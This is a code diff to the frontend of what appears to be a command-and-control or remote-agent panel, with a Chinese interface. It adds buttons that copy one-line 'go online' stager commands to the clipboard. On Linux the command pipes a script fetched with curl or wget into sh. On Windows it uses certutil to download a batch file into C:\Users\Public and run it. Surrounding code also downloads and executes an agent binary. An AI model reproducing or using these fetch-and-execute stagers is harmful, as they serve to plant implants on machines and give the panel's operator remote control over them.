@@ -50,6 +50,25 @@ function cmd(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux
   return `curl -sSL '${u}' -o agent.bin && chmod +x agent.bin && ./agent.bin`
 }
 
+// 4.9.3 的一键上线命令模板（原文见 FRONTEND-493）：
+//   Linux  : (curl -fsSL -m180 {base}/slt||wget -T180 -q {base}/slt)|sh
+//   Windows: certutil.exe -urlcache -split -f {base}/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
+const base = () => location.origin
+function oneLiner(platform: 'linux' | 'windows', useWS: boolean) {
+  const p = useWS ? (platform === 'windows' ? 'sww' : 'slw') : (platform === 'windows' ? 'swt' : 'slt')
+  const url = `${base()}/${p}?id=${form.id}&arch=${form.arch}`
+  if (platform === 'windows') {
+    return `certutil.exe -urlcache -split -f ${url} C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`
+  }
+  return `(curl -fsSL -m180 ${url}||wget -T180 -q ${url})|sh`
+}
+
+async function copyOneLiner(platform: 'linux' | 'windows', useWS = false) {
+  const c = oneLiner(platform, useWS)
+  try { await navigator.clipboard.writeText(c); message.success('命令已复制') }
+  catch { message.info(c) }
+}
+
 async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' | 'linux' = 'auto') {
   const c = cmd(kind, platform)
   if (!c) return
@@ -84,8 +103,8 @@ async function copy(kind: 'stageless' | 'listen', platform: 'auto' | 'windows' |
     <a-space wrap>
       <a-button type="primary" @click="download('stageless')">下载</a-button>
       <a-button @click="copy('stageless')">一键上线命令查看</a-button>
-      <a-button @click="copy('stageless', 'windows')">Windows 上线命令</a-button>
-      <a-button @click="copy('stageless', 'linux')">Linux 上线命令</a-button>
+      <a-button @click="copyOneLiner('linux')">Linux 上线命令</a-button>
+      <a-button @click="copyOneLiner('windows')">Windows 上线命令</a-button>
     </a-space>
 
     <a-divider>正向客户端（独立 listen 载荷）</a-divider>
